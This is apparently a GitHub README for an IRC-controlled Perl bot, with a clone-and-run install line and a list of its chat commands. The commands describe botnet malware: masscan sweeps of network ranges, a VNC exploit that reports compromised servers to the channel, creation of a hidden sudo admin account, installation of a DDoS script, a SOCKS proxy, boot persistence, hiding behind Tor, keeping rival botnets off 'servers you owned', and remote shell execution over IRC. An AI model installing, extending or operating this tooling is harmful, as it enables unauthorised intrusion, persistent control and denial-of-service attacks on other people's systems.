This code is an IRC BOT that can connect to an IRC server with SSL
The main purpose of this bot is to scan for Open/Unsecured VNC servers.

## ---INSTALLATION---

### git clone https://github.com/ind3p3nd3nt/vncperlbot && sh vncperlbot/Config

## ----COMMANDS----
## NOTE:The commands can be done via PRIVATE MESSAGE and CHANNEL also.
### ----------------
## NEW COMMAND: @.getssh <= This will make a random admin account/password with sudo powers (use: sudo su :to get root access)
### ----------------
## Using this command will start masscan on your Local Area Network, or the LAN which the bot is installed on.
### @.scan 192.168.0.0-192.168.255.255 
## This needs to be done before each @.exploit
### @.format 
## This runs the VNC exploit and reports the working VNCs to the channel
### @.exploit 
## This kills the exploit run
### @.stopexploit 
## This installs ddos.py on the root account
### @.ddos
## This blocks botnets from scanning your servers you owned
### @.blocknoobs
## This resets the iptables firewall to initial state and deletes all the rules that were made to it
### @.fwreset
## This runs a socks5 server on port 1080
### @.socks
## This updates the autorun of the bot on boot 
### @.autorun
## This installs a xfce4 remote desktop on a random port accessible by your browser (tested working on debian)
### @.novnc
## This installs proxychains and tor socks and hides the bot behind a tor node before connecting your server
### @.cloak
## NOTE: You can control the bot by saying "sudo command args" and the bot will reply the output of the terminal also the bot will connect back to the server if it gets disconnected from it.
